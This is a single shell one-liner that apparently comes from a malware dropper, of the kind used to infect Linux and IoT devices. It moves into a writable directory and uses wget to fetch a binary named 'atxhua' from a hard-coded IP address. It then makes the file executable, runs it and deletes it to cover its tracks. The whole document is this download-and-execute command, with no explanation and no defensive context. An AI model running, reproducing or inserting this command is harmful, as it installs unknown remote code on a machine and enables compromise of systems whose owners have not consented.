cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.17.43.108/atxhua; chmod +x atxhua; ./atxhua; rm -rf atxhua
